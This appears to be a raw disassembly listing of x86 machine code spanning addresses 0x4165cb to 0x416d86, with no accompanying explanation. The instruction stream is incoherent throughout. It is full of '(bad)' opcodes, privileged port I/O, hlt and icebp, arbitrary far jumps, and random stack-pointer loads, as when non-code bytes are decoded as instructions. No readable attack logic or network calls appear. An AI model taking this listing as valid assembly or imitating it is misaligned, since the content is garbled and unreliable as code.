  4165cb:	sub    edx,DWORD PTR [esi]
  4165cd:	jnp    0x41660b
  4165cf:	in     eax,0xa3
  4165d1:	mov    BYTE PTR [edx+ecx*4+0x166d349b],ch
  4165d8:	adc    cl,BYTE PTR [ebp-0x7a]
  4165db:	cmp    al,0xaa
  4165dd:	mov    eax,0x459e3fc5
  4165e2:	push   edx
  4165e3:	in     al,dx
  4165e4:	mov    esp,0x50f7041
  4165e9:	sub    ecx,ebx
  4165eb:	xchg   bx,ax
  4165ed:	pop    ebx
  4165ee:	xor    al,0xe1
  4165f0:	sub    ecx,DWORD PTR [ebp+0x6477c050]
  4165f6:	inc    ecx
  4165f7:	dec    esi
  4165f8:	std    
  4165f9:	ficom  WORD PTR gs:[eax-0xf]
  4165fd:	mov    esp,0xd0ab87ec
  416602:	lods   al,BYTE PTR ds:[esi]
  416603:	push   ss
  416604:	(bad)  
  416605:	xchg   ebx,eax
  416606:	mov    WORD PTR [edx],es
  416608:	push   ss
  416609:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41660a:	imul   ah
  41660c:	out    0xe,al
  41660e:	mov    ah,BYTE PTR [eax+0x17]
  416611:	shl    ah,1
  416613:	loopne 0x41662d
  416615:	pop    ss
  416616:	sub    edi,ecx
  416618:	hlt    
  416619:	xor    dl,BYTE PTR [edi+0x23c5c09a]
  41661f:	and    BYTE PTR [esi-0x75],ah
  416622:	hlt    
  416623:	sbb    bh,BYTE PTR [edi+0x39e1912a]
  416629:	pop    edx
  41662a:	push   ebx
  41662b:	popa   
  41662c:	dec    eax
  41662d:	(bad)  
  41662e:	fidiv  DWORD PTR [ecx+0x6a466b20]
  416634:	sub    ebp,esp
  416636:	mov    esi,0x16f579dc
  41663b:	jnp    0x41660d
  41663d:	pusha  
  41663e:	sub    eax,0x21684151
  416643:	loopne 0x4165fd
  416645:	dec    ebp
  416646:	daa    
  416647:	cmp    al,0x90
  416649:	ja     0x4165cb
  41664b:	fild   QWORD PTR ds:0xd6e133db
  416651:	lods   al,BYTE PTR ds:[esi]
  416652:	adc    al,0xbc
  416654:	add    esp,DWORD PTR [edi-0x1e250198]
  41665a:	bndldx bnd1,[ebp-0x5f]
  41665e:	popf   
  41665f:	pop    ebx
  416660:	ins    BYTE PTR es:[edi],dx
  416661:	imul   edi,DWORD PTR [eax-0x14],0xffffff92
  416665:	jbe    0x416661
  416667:	ins    DWORD PTR es:[edi],dx
  416668:	das    
  416669:	sahf   
  41666a:	dec    edx
  41666b:	in     eax,dx
  41666c:	dec    esi
  41666d:	jno    0x41664b
  41666f:	jno    0x416627
  416671:	sbb    edi,DWORD PTR [ebx+0x58]
  416674:	sub    dl,BYTE PTR [ebp+0x23]
  416677:	js     0x41662e
  416679:	jbe    0x4166ee
  41667b:	xchg   edi,eax
  41667c:	lea    eax,[edi]
  41667e:	cmp    edx,esp
  416680:	in     al,0x8b
  416682:	mov    edi,0xf5ec77be
  416687:	mov    eax,edi
  416689:	dec    ebx
  41668a:	pop    ss
  41668b:	jbe    0x416651
  41668d:	in     al,0x30
  41668f:	ret    0x868d
  416692:	push   es
  416693:	fnstsw WORD PTR [edi]
  416695:	dec    edx
  416696:	push   ds
  416697:	mov    ebp,0x2a21a0fb
  41669c:	mov    esp,0x5043ad68
  4166a1:	mov    dl,0x3d
  4166a3:	sahf   
  4166a4:	and    dh,BYTE PTR [esi+edx*1+0x36b5fd5]
  4166ab:	adc    edi,DWORD PTR [edi+eiz*4]
  4166ae:	sbb    al,0xb9
  4166b0:	sub    DWORD PTR [ebx+0x18163cb],esi
  4166b6:	pop    ss
  4166b7:	or     BYTE PTR [ebx+0x4],0xca
  4166bb:	ins    BYTE PTR es:[edi],dx
  4166bc:	ret    0x921e
  4166bf:	or     ecx,DWORD PTR [eax]
  4166c1:	test   DWORD PTR [eax-0x14],edi
  4166c4:	or     eax,0xaa3ebbc7
  4166c9:	ret    0x51ce
  4166cc:	adc    eax,0x668ca938
  4166d1:	cmp    edi,DWORD PTR [esi]
  4166d3:	lahf   
  4166d4:	dec    ebp
  4166d5:	push   0xe2c24b56
  4166da:	es jae 0x4166f8
  4166dd:	imul   ebp,ebx,0xdf8fa9cf
  4166e3:	ret    
  4166e4:	mov    ch,0x6e
  4166e6:	mov    al,0xd7
  4166e8:	ja     0x4166b4
  4166ea:	mov    dh,BYTE PTR [eax+eiz*8]
  4166ed:	mov    ch,BYTE PTR [edx*8-0x4f2902b2]
  4166f4:	jp     0x4166bd
  4166f6:	cld    
  4166f7:	cld    
  4166f8:	into   
  4166f9:	fadd   DWORD PTR [edx]
  4166fb:	inc    ebp
  4166fc:	fmul   QWORD PTR [ebp-0x51436bdf]
  416702:	(bad)
  416705:	sub    edx,edx
  416707:	mov    edx,0x616f05b6
  41670c:	add    BYTE PTR [edi-0x4],0xa6
  416710:	push   esi
  416711:	or     al,BYTE PTR [edi+0x2e]
  416714:	push   edx
  416715:	call   0xc22a:0x151703ac
  41671c:	inc    edi
  41671d:	je     0x41672d
  41671f:	in     al,0xb7
  416721:	int3   
  416722:	ins    BYTE PTR es:[edi],dx
  416723:	rcr    DWORD PTR [edi-0x56],0x3f
  416727:	mul    DWORD PTR [ebx+0x77d23808]
  41672d:	or     ecx,DWORD PTR [ecx+eax*8+0x42]
  416731:	push   0x73
  416733:	ficom  WORD PTR [ecx+0x32]
  416736:	test   DWORD PTR [esi+0x6c1b5d3e],0x1e26dbd6
  416740:	ret    0xbb7c
  416743:	test   eax,0x3f55ee68
  416748:	popa   
  416749:	dec    cx
  41674b:	mov    al,ds:0xdbf14b0
  416750:	gs push esi
  416752:	sahf   
  416753:	daa    
  416754:	mov    eax,ds:0xe3211c12
  416759:	mov    al,0xec
  41675b:	adc    al,0x6e
  41675d:	mov    ds:0xf6547f5b,al
  416762:	out    dx,eax
  416763:	ds mov al,0x5d
  416766:	push   0x85ea0e27
  41676b:	pushf  
  41676c:	push   es
  41676d:	shl    BYTE PTR [edi+edi*1+0x6319dde7],0xa6
  416775:	cdq    
  416776:	sahf   
  416777:	cwde   
  416778:	jmp    0xbd5d:0xaee97991
  41677f:	or     dl,BYTE PTR [eax-0x2a]
  416782:	cmc    
  416783:	jbe    0x4167da
  416785:	xchg   DWORD PTR [eax-0x43a6b0ad],edx
  41678b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41678c:	out    0x25,eax
  41678e:	push   0x23
  416790:	adc    al,0x4e
  416792:	push   ecx
  416793:	jg     0x4167b8
  416795:	call   DWORD PTR [ebx]
  416797:	cli    
  416798:	rcr    BYTE PTR [esi-0x68810c49],0x87
  41679f:	xor    eax,0xfda774dd
  4167a4:	ds lahf 
  4167a6:	pop    ebp
  4167a7:	cli    
  4167a8:	inc    edi
  4167a9:	arpl   WORD PTR [ebx+0x1b],sp
  4167ac:	dec    ebp
  4167ad:	arpl   WORD PTR [esp+esi*1+0x75f7c5b3],sp
  4167b4:	imul   esp,edx,0x57
  4167b7:	inc    ecx
  4167b8:	pushf  
  4167b9:	shl    DWORD PTR [eax-0x580ffd21],0x6a
  4167c0:	jo     0x416823
  4167c2:	bound  ebx,QWORD PTR [edx]
  4167c4:	call   0x6ba2ea00
  4167c9:	inc    edx
  4167ca:	and    eax,0xf40d41e8
  4167cf:	daa    
  4167d0:	ss push ecx
  4167d2:	fcmovnu st,st(6)
  4167d4:	jle    0x41675f
  4167d6:	mov    ebp,0x9528069a
  4167db:	sub    eax,0xaab61830
  4167e0:	dec    ebp
  4167e1:	push   ebx
  4167e2:	fadd   DWORD PTR [eax]
  4167e4:	mov    al,ds:0xef85ffd7
  4167e9:	or     eax,edi
  4167eb:	mov    ch,0x57
  4167ed:	pause  
  4167ef:	mul    DWORD PTR [esp+edi*1-0x77a6e938]
  4167f6:	test   eax,0x8efaef97
  4167fb:	mov    WORD PTR [edx*2-0x15d14446],cs
  416802:	inc    edx
  416803:	sub    al,0x23
  416805:	cmp    al,0xe5
  416807:	xchg   DWORD PTR [ebx-0x2389fb29],ebp
  41680d:	(bad)  
  41680e:	cs and al,0x2b
  416811:	mov    ah,bh
  416813:	sahf   
  416814:	bound  edi,QWORD PTR [esi+0x22]
  416817:	retf   0x4c06
  41681a:	pushf  
  41681b:	inc    edx
  41681c:	xor    eax,0x3393a0ec
  416821:	push   edx
  416822:	stc    
  416823:	xchg   esp,eax
  416824:	test   DWORD PTR [edx+0x2bafdd3e],esi
  41682a:	push   es
  41682b:	fwait
  41682c:	mov    ah,0xea
  41682e:	mov    ds:0x7970c35b,al
  416833:	and    eax,0x66afef64
  416838:	jno    0x4167d7
  41683a:	out    0x9c,eax
  41683c:	adc    DWORD PTR [eax-0x76],ebx
  41683f:	or     DWORD PTR [ebx],edi
  416841:	xchg   esi,eax
  416842:	loop   0x416839
  416844:	popa   
  416845:	pop    edx
  416846:	mov    al,BYTE PTR [esi-0x7d]
  416849:	and    ebx,0xf1291b4e
  41684f:	add    bl,BYTE PTR [edx]
  416851:	fimul  WORD PTR [ebx]
  416853:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  416854:	fldcw  WORD PTR [esi+0x41]
  416857:	ret    0x279a
  41685a:	cmp    dh,ch
  41685c:	sahf   
  41685d:	push   ebp
  41685e:	sbb    dl,BYTE PTR [eax+ecx*8-0x1d]
  416862:	sub    BYTE PTR [esi+0x4],dh
  416865:	ja     0x416886
  416867:	sbb    BYTE PTR [edx],al
  416869:	test   BYTE PTR [ebp+esi*2-0x78],0x36
  41686e:	lock leave 
  416870:	in     eax,0x3f
  416872:	out    0xc4,eax
  416874:	iret   
  416875:	out    dx,al
  416876:	imul   edx,DWORD PTR [esi+0xf],0xffffffc7
  41687a:	cwde   
  41687b:	mov    edx,0x1cc3892b
  416880:	idiv   DWORD PTR [edi]
  416882:	or     eax,0x1a520cb2
  416887:	mov    al,0x3b
  416889:	out    0x6a,al
  41688b:	sub    bl,BYTE PTR [ecx-0x78]
  41688e:	sbb    DWORD PTR [edx-0x7],edx
  416891:	inc    edx
  416892:	jle    0x416864
  416894:	adc    BYTE PTR [ebx+0x6d],cl
  416897:	pop    ebx
  416898:	repz jg 0x4168eb
  41689b:	bound  esp,QWORD PTR [ecx+ebx*4-0x36f46d0f]
  4168a2:	mov    ecx,0x48831399
  4168a7:	test   ebx,ebx
  4168a9:	or     eax,DWORD PTR [ebx-0x741c56cd]
  4168af:	adc    cl,BYTE PTR ss:[esi-0x7e46595f]
  4168b6:	into   
  4168b7:	xchg   edi,ecx
  4168b9:	push   es
  4168ba:	daa    
  4168bb:	adc    al,0xf4
  4168bd:	inc    eax
  4168be:	mov    BYTE PTR [ebx-0x4a016422],ch
  4168c4:	fistp  QWORD PTR [ebx]
  4168c6:	and    ch,bl
  4168c8:	cmp    dh,dh
  4168ca:	adc    DWORD PTR [ebx+0x747b8dc3],esp
  4168d0:	vpaddsw ymm0,ymm7,YMMWORD PTR [edx+0x22]
  4168d5:	das    
  4168d6:	cmp    BYTE PTR [ecx+edi*4-0x1a],bh
  4168da:	test   BYTE PTR [ecx+0x3c3eec35],0xc8
  4168e1:	stos   DWORD PTR es:[edi],eax
  4168e2:	test   al,0xe0
  4168e4:	fist   DWORD PTR [ebp-0x64]
  4168e7:	push   esp
  4168e8:	icebp  
  4168e9:	add    DWORD PTR [ebx+0x3],ecx
  4168ec:	push   ecx
  4168ed:	or     dh,BYTE PTR [esi]
  4168ef:	sbb    eax,DWORD PTR [ecx-0x3a51c97e]
  4168f5:	xor    eax,DWORD PTR [ebx+0xf42f4f6]
  4168fb:	xlat   BYTE PTR ds:[ebx]
  4168fc:	jecxz  0x41697c
  4168fe:	rcl    ch,1
  416900:	(bad)  
  416901:	pop    esp
  416902:	add    eax,0xadf90c9e
  416907:	xor    ebp,DWORD PTR [edx]
  416909:	mov    eax,ds:0xdc3504dc
  41690e:	pop    ss
  41690f:	inc    edx
  416910:	clc    
  416911:	fld    QWORD PTR [ecx]
  416913:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  416914:	add    bl,BYTE PTR [edi]
  416916:	xor    DWORD PTR es:[ebx],esp
  416919:	or     esp,DWORD PTR [ebx]
  41691b:	retf   0x96b9
  41691e:	test   BYTE PTR [edi-0x4fcbf4b9],al
  416924:	or     esi,esi
  416926:	ret    0xa0ce
  416929:	mov    dh,0xf2
  41692b:	ror    BYTE PTR [ecx+0x7085a1],cl
  416931:	es loope 0x416953
  416934:	fbstp  TBYTE PTR [ebx]
  416936:	adc    DWORD PTR [edx-0x70ff9c93],edi
  41693c:	les    ebx,FWORD PTR [ecx-0x4c9199f]
  416942:	ins    DWORD PTR es:[edi],dx
  416943:	push   ebx
  416944:	cmp    DWORD PTR [eax+ecx*4],eax
  416947:	jbe    0x41698e
  416949:	push   edx
  41694a:	mov    esi,0xc95b31ae
  41694f:	pop    esp
  416950:	shr    DWORD PTR [esi],0x25
  416953:	or     eax,0x56c04076
  416958:	mov    ah,0x47
  41695a:	push   edi
  41695b:	cmp    ah,dh
  41695d:	scas   eax,DWORD PTR es:[edi]
  41695e:	rcr    BYTE PTR [eax],0xef
  416961:	jmp    0x6ed3:0xf264708e
  416968:	dec    eax
  416969:	mov    ebp,0x3f06b5da
  41696e:	mov    ch,0xf2
  416970:	sbb    esi,esi
  416972:	adc    DWORD PTR [ebx+0x3e7d7f82],edx
  416978:	inc    ebp
  416979:	enter  0x2905,0xb4
  41697d:	adc    al,0x54
  41697f:	ret    
  416980:	scas   eax,DWORD PTR es:[edi]
  416981:	fnsave [edi+0x38]
  416984:	stc    
  416985:	push   es
  416986:	sub    cl,dh
  416988:	lods   al,BYTE PTR ds:[esi]
  416989:	mov    ah,0xc4
  41698b:	bound  edx,QWORD PTR [ecx-0x897e8e6]
  416991:	(bad)  
  416992:	mov    ch,0x6f
  416994:	inc    eax
  416995:	sub    DWORD PTR [edx],0x55025ff
  41699b:	ss sbb eax,0x5bfd30ad
  4169a1:	in     al,0x8b
  4169a3:	jnp    0x416a19
  4169a5:	sti    
  4169a6:	sbb    BYTE PTR [esi+0x7b13e1ab],0x59
  4169ad:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4169ae:	ss ret 
  4169b0:	cmp    cl,BYTE PTR [ecx+0x44]
  4169b3:	jb     0x41693e
  4169b5:	dec    eax
  4169b6:	(bad)  
  4169b7:	jp     0x416979
  4169b9:	int3   
  4169ba:	xor    BYTE PTR [edi+0x7c93ce54],dh
  4169c0:	push   edi
  4169c1:	ret    
  4169c2:	dec    ecx
  4169c3:	sub    eax,0x822ea93d
  4169c8:	mov    eax,cs
  4169ca:	mov    esp,DWORD PTR ds:0x85bc158
  4169d1:	loop   0x416970
  4169d3:	and    ebp,DWORD PTR [ebx]
  4169d5:	mov    ds:0xda35e86a,al
  4169da:	fwait
  4169db:	sub    BYTE PTR [ebx],cl
  4169dd:	in     eax,dx
  4169de:	std    
  4169df:	shr    DWORD PTR [ebx-0x23],cl
  4169e2:	mov    eax,0xc51ff767
  4169e7:	add    esi,edx
  4169e9:	jnp    0x416a41
  4169eb:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4169ec:	inc    esi
  4169ed:	add    al,BYTE PTR [ecx]
  4169ef:	(bad)  
  4169f0:	pop    esp
  4169f1:	mov    cx,0xbd04
  4169f5:	in     eax,0xec
  4169f7:	mov    cs,WORD PTR [ebx+0x6284cb9f]
  4169fd:	(bad)  
  4169fe:	mov    ebp,0xe8fff88a
  416a03:	xor    DWORD PTR [edi],0x284992e7
  416a09:	push   edx
  416a0a:	or     al,0x6a
  416a0c:	sbb    eax,0x28140aa5
  416a11:	xchg   ebx,eax
  416a12:	mov    ch,ch
  416a14:	das    
  416a15:	stc    
  416a16:	call   0x2a3cfb27
  416a1b:	ret    0xd651
  416a1e:	leave  
  416a1f:	stos   DWORD PTR es:[edi],eax
  416a20:	and    cl,BYTE PTR [edi-0x1]
  416a23:	pop    eax
  416a24:	in     al,dx
  416a25:	icebp  
  416a26:	mov    bl,0xab
  416a28:	dec    esp
  416a29:	arpl   WORD PTR [edx-0x29],dx
  416a2c:	adc    BYTE PTR [ebx+0x55],bh
  416a2f:	jle    0x416aa7
  416a31:	mov    ch,cl
  416a33:	pusha  
  416a34:	cmps   DWORD PTR fs:[esi],DWORD PTR es:[edi]
  416a36:	pop    edi
  416a37:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  416a38:	mov    ch,0xa0
  416a3a:	fs ss fwait
  416a3d:	cmps   WORD PTR ds:[esi],WORD PTR es:[edi]
  416a3f:	mov    ah,0x1d
  416a41:	inc    ebx
  416a42:	in     eax,0x7d
  416a44:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  416a45:	test   BYTE PTR [edi],0x9b
  416a48:	repz scas al,BYTE PTR es:[edi]
  416a4a:	add    ebx,DWORD PTR [ebp-0x7775bc0b]
  416a50:	ficom  DWORD PTR [ebp+0xc]
  416a53:	out    dx,al
  416a54:	aam    0xfe
  416a56:	pushf  
  416a57:	dec    DWORD PTR [edx+0x4c]
  416a5a:	dec    ebx
  416a5b:	jnp    0x4169fe
  416a5d:	dec    esp
  416a5e:	popa   
  416a5f:	cmp    eax,DWORD PTR [ebx+0x5a]
  416a62:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  416a63:	adc    esi,DWORD PTR [esi-0x6a8e10b9]
  416a69:	sub    edi,DWORD PTR [ebx]
  416a6b:	push   ebp
  416a6c:	jp     0x416a0c
  416a6e:	repz clc 
  416a70:	enter  0x4e35,0x54
  416a74:	aaa    
  416a75:	inc    ebx
  416a76:	and    bl,bh
  416a78:	inc    esi
  416a79:	fyl2xp1 
  416a7b:	icebp  
  416a7c:	xchg   ecx,eax
  416a7d:	shr    DWORD PTR fs:[edi-0xd],cl
  416a81:	inc    edx
  416a82:	cli    
  416a83:	mov    ds:0xaf84d0d4,al
  416a88:	xor    al,BYTE PTR [edx+eiz*4+0x4d04748b]
  416a8f:	aad    0x33
  416a91:	sub    DWORD PTR [edx-0x6e],0xffffffe5
  416a95:	shl    esp,0x52
  416a98:	sub    eax,0xd11ad0c6
  416a9d:	inc    esi
  416a9e:	cmc    
  416a9f:	jmp    0x416a5b
  416aa1:	in     eax,0x4c
  416aa3:	loopne 0x416ac5
  416aa5:	in     eax,0xff
  416aa7:	lods   al,BYTE PTR ds:[esi]
  416aa8:	and    al,0x5e
  416aaa:	(bad)  
  416aab:	nop
  416aac:	xchg   esp,eax
  416aad:	cmp    eax,0xe56a5b33
  416ab2:	cwde   
  416ab3:	add    al,0xac
  416ab5:	jbe    0x416a9a
  416ab7:	mov    eax,ds:0x7e1f582f
  416abc:	mov    eax,0xc95573db
  416ac1:	call   0x1351:0xb7564074
  416ac8:	sub    al,0x79
  416aca:	dec    ebx
  416acb:	es jns 0x416adf
  416ace:	pushf  
  416acf:	sub    DWORD PTR [edx-0x20a81d75],ebp
  416ad5:	je     0x416ab5
  416ad7:	cwde   
  416ad8:	jmp    0x6bac:0x9f067e02
  416adf:	shl    BYTE PTR [edi+0x61d8cc8d],0x8b
  416ae6:	outs   dx,DWORD PTR ds:[esi]
  416ae7:	rcr    BYTE PTR [ebx],0xb6
  416aea:	test   al,0x17
  416aec:	lds    ebp,FWORD PTR [edi-0x14]
  416aef:	cmc    
  416af0:	out    0xef,al
  416af2:	dec    ecx
  416af3:	cli    
  416af4:	inc    esi
  416af5:	or     BYTE PTR [eax*8+0x60293f74],al
  416afc:	jecxz  0x416ae2
  416afe:	inc    edi
  416aff:	cwde   
  416b00:	xchg   BYTE PTR [edx+0x10993715],bl
  416b06:	mov    ebx,0x1acd2499
  416b0b:	adc    bl,BYTE PTR [esi]
  416b0d:	push   ecx
  416b0e:	sbb    BYTE PTR [ecx],al
  416b10:	(bad)  
  416b11:	xor    bh,bh
  416b13:	in     al,dx
  416b14:	out    0x41,eax
  416b16:	add    eax,0xb4336213
  416b1b:	inc    ecx
  416b1c:	icebp  
  416b1d:	dec    ecx
  416b1e:	or     DWORD PTR [esi+0xd],edi
  416b21:	arpl   WORD PTR [edi],ax
  416b23:	pop    esi
  416b24:	das    
  416b25:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  416b26:	(bad)  
  416b28:	popf   
  416b29:	dec    esi
  416b2a:	push   edx
  416b2b:	bound  ebx,QWORD PTR [ebp+0x48]
  416b2e:	push   eax
  416b2f:	es gs xchg esi,eax
  416b32:	mov    eax,ds:0x1dc3d616
  416b37:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  416b38:	inc    esp
  416b39:	sbb    DWORD PTR [eax+0x56c95a46],ebx
  416b3f:	aam    0x6d
  416b41:	scas   eax,DWORD PTR es:[edi]
  416b42:	xchg   edi,eax
  416b43:	enter  0x5bf0,0x23
  416b47:	inc    edi
  416b48:	fadd   st,st(6)
  416b4a:	repz pop edi
  416b4c:	xor    BYTE PTR [ecx],ch
  416b4e:	mov    esi,ebx
  416b50:	xchg   DWORD PTR [eax+0x7defd5d6],ebx
  416b56:	jg     0x416b49
  416b58:	push   ecx
  416b59:	cs or  eax,0x3e0838c3
  416b5f:	popf   
  416b60:	data16 sahf 
  416b62:	test   BYTE PTR [ecx-0x34],bl
  416b65:	sbb    DWORD PTR [esi],esi
  416b67:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  416b68:	inc    ecx
  416b69:	push   ecx
  416b6a:	jmp    0x416bb0
  416b6c:	or     al,0x7e
  416b6e:	fidiv  DWORD PTR [ecx-0x33]
  416b71:	pop    ebp
  416b72:	and    ah,ah
  416b74:	push   edx
  416b75:	int    0xab
  416b77:	mov    cl,0x57
  416b79:	xchg   BYTE PTR [edi+0x6ff196fd],ch
  416b7f:	sbb    BYTE PTR [ebx-0x674a7ec1],al
  416b85:	cmp    DWORD PTR [ebp+0x52c5c50c],ebp
  416b8b:	sbb    al,0x66
  416b8d:	pop    ebx
  416b8e:	sub    eax,0xc51ded5d
  416b93:	jnp    0x416bb8
  416b95:	cmp    bh,BYTE PTR [ebx+0x13f0567f]
  416b9b:	mov    ebp,0x639e59ea
  416ba0:	lds    edx,FWORD PTR ds:0xd498d5f5
  416ba6:	(bad)  
  416ba7:	and    DWORD PTR [ecx],eax
  416ba9:	into   
  416baa:	mov    ds:0xa8abf363,al
  416baf:	test   al,0x98
  416bb1:	repnz scas al,BYTE PTR es:[edi]
  416bb3:	test   DWORD PTR [ebp+0x58f65b7d],esi
  416bb9:	outs   dx,BYTE PTR ds:[esi]
  416bba:	mov    ds:0x49201e50,al
  416bbf:	sbb    al,0xc3
  416bc1:	and    BYTE PTR [eax-0xf3d98ca],bl
  416bc7:	test   DWORD PTR [ebp+edi*4+0x5],0x7ee6027e
  416bcf:	mov    WORD PTR [edx+0x5a],es
  416bd2:	icebp  
  416bd3:	xor    DWORD PTR [edx-0x4b4c139e],ebx
  416bd9:	mov    BYTE PTR [ebx],bl
  416bdb:	mov    edx,0x87c91557
  416be0:	out    dx,eax
  416be1:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  416be2:	arpl   WORD PTR [edi],bp
  416be4:	jne    0x416b84
  416be6:	lahf   
  416be7:	inc    ecx
  416be8:	aam    0xd9
  416bea:	cdq    
  416beb:	add    ah,BYTE PTR [edi+0x58999fa8]
  416bf1:	jecxz  0x416bf5
  416bf3:	int3   
  416bf4:	sub    esi,DWORD PTR ds:0x73c56bab
  416bfa:	push   es
  416bfb:	js     0x416beb
  416bfd:	sahf   
  416bfe:	sar    eax,0xf1
  416c01:	jae    0x416c1c
  416c03:	sub    ebp,esi
  416c05:	jp     0x416ba0
  416c07:	pushf  
  416c08:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  416c09:	push   esp
  416c0a:	mov    ds:0x31a46b82,al
  416c0f:	out    0x28,al
  416c11:	loop   0x416bb8
  416c13:	add    DWORD PTR [esi],ebx
  416c15:	xchg   edx,eax
  416c16:	xor    BYTE PTR [edx-0x65],al
  416c19:	adc    ebx,DWORD PTR [esi+0x6c]
  416c1c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  416c1d:	sar    BYTE PTR ds:0xc97480aa,1
  416c23:	cmp    eax,0xad827c
  416c28:	mov    fs,WORD PTR [edi]
  416c2a:	jae    0x416bc7
  416c2c:	jge    0x416c20
  416c2e:	xor    al,0x8
  416c30:	test   al,0x22
  416c32:	mov    ebx,0x42fff038
  416c37:	cld    
  416c38:	cwde   
  416c39:	sbb    edx,edx
  416c3b:	neg    DWORD PTR [edx+0xe571294]
  416c41:	and    bl,BYTE PTR [ebx-0x65]
  416c44:	loop   0x416c4f
  416c46:	inc    ebx
  416c47:	aas    
  416c48:	std    
  416c49:	shl    BYTE PTR [edx],1
  416c4b:	cmp    BYTE PTR [edx+0x2adf2ba0],0x82
  416c52:	adc    eax,0x686dbaaf
  416c57:	ja     0x416c4c
  416c59:	cmp    DWORD PTR [eax],ebx
  416c5b:	pop    edi
  416c5c:	test   ecx,0xb0d53346
  416c62:	dec    edi
  416c63:	sti    
  416c64:	fnstcw WORD PTR [edi+0x471d38d5]
  416c6a:	aad    0xea
  416c6c:	clc    
  416c6d:	fs jno 0x416c30
  416c70:	sbb    al,0xd7
  416c72:	adc    DWORD PTR [ecx],ebx
  416c74:	iret   
  416c75:	push   0x6dacc91e
  416c7a:	xchg   esp,eax
  416c7b:	mov    ecx,0x6b02d52e
  416c80:	or     BYTE PTR [ecx-0x45],ah
  416c83:	outs   dx,BYTE PTR ds:[esi]
  416c84:	xchg   esp,eax
  416c85:	push   esi
  416c86:	lods   al,BYTE PTR ds:[esi]
  416c87:	add    al,0xcd
  416c89:	jge    0x416ccc
  416c8b:	sbb    cl,BYTE PTR [ecx+0x195d9963]
  416c91:	inc    ebp
  416c92:	mov    eax,0x5d26d083
  416c97:	or     bl,bl
  416c99:	cwde   
  416c9a:	fild   DWORD PTR [ebx]
  416c9c:	xlat   BYTE PTR ds:[ebx]
  416c9d:	mov    ebx,0x7d970bc
  416ca2:	cmp    eax,edx
  416ca4:	out    dx,al
  416ca5:	repz xor DWORD PTR [ebx],eax
  416ca8:	xchg   esi,eax
  416ca9:	jnp    0x416d1c
  416cab:	mov    al,ds:0x31261ac1
  416cb0:	mov    ss,WORD PTR [esi+0x39]
  416cb3:	xchg   ebp,eax
  416cb4:	repnz iret 
  416cb6:	xlat   BYTE PTR ds:[ebx]
  416cb7:	dec    edx
  416cb8:	push   ss
  416cb9:	sbb    al,0x74
  416cbb:	sub    ecx,DWORD PTR [ebx+0x74]
  416cbe:	jecxz  0x416cf7
  416cc0:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  416cc1:	add    ch,bl
  416cc3:	jle    0x416d0a
  416cc5:	and    BYTE PTR [edx],ch
  416cc7:	cmp    al,0x21
  416cc9:	cdq    
  416cca:	dec    eax
  416ccb:	jae    0x416cfb
  416ccd:	xchg   edx,eax
  416cce:	or     edi,DWORD PTR [ecx-0x5d]
  416cd1:	mov    WORD PTR [esi-0x6f],ss
  416cd4:	jge    0x416c7b
  416cd6:	enter  0x107,0x98
  416cda:	dec    ecx
  416cdb:	pop    es
  416cdc:	sbb    esp,0x3e
  416cdf:	or     dh,dh
  416ce1:	xchg   edx,eax
  416ce2:	test   BYTE PTR [edx+0x2c7abaa8],bl
  416ce8:	jge    0x416d42
  416cea:	in     al,dx
  416ceb:	cmp    eax,0x8cba1c44
  416cf0:	push   eax
  416cf1:	repnz lds ecx,FWORD PTR [ebx+0x58397894]
  416cf8:	icebp  
  416cf9:	pand   mm4,QWORD PTR [edi]
  416cfc:	les    edx,FWORD PTR [ebx+0x46]
  416cff:	retf   
  416d00:	repnz out dx,eax
  416d02:	mov    cl,0xdd
  416d04:	dec    ebx
  416d05:	(bad)  
  416d06:	mov    edi,0x9144fab0
  416d0b:	or     bh,BYTE PTR [eax+0x36]
  416d0e:	mov    eax,0xbae58419
  416d13:	pop    edx
  416d14:	push   0x58
  416d16:	sub    esi,DWORD PTR [edi-0x47]
  416d19:	mov    esi,0xf41c9cdc
  416d1e:	in     eax,0x77
  416d20:	ins    BYTE PTR es:[edi],dx
  416d21:	push   ds
  416d22:	retf   0x362d
  416d25:	int3   
  416d26:	adc    al,0x5
  416d28:	ins    BYTE PTR es:[edi],dx
  416d29:	test   BYTE PTR [ebp+0x4946e156],0xe6
  416d30:	shl    DWORD PTR [esi-0x408d119b],cl
  416d36:	aam    0xd2
  416d38:	xlat   BYTE PTR ds:[ebx]
  416d39:	pop    esi
  416d3a:	and    esi,esi
  416d3c:	adc    al,0x95
  416d3e:	sbb    bl,BYTE PTR [ebx]
  416d40:	add    dl,BYTE PTR [esi+0x63123951]
  416d46:	dec    ecx
  416d47:	popa   
  416d48:	and    eax,0xd6d139e3
  416d4d:	mov    bh,0xf3
  416d4f:	and    dh,BYTE PTR [eax+0x35f2a59]
  416d55:	cmps   DWORD PTR gs:[esi],DWORD PTR es:[edi]
  416d57:	adc    DWORD PTR [ebp+0x64],ebx
  416d5a:	jmp    0xc779:0xb3a9243c
  416d61:	xor    al,0xac
  416d63:	retf   0x6810
  416d66:	xor    ebp,DWORD PTR [ecx]
  416d68:	ficom  WORD PTR [edx]
  416d6a:	xchg   edx,eax
  416d6b:	sbb    eax,0xdffef53c
  416d70:	test   BYTE PTR [ebx+0x1a],0x75
  416d74:	cmp    edi,eax
  416d76:	ficom  WORD PTR [eax+0x31]
  416d79:	jmp    0x416d53
  416d7b:	adc    DWORD PTR [ebx],esi
  416d7d:	push   0x4d
  416d7f:	xchg   BYTE PTR [eax],cl
  416d81:	rcr    BYTE PTR [ecx],cl
  416d83:	sub    DWORD PTR [ecx-0x25],eax
  416d86:	and    BYTE PTR [ebp+0x774c2a68],cl
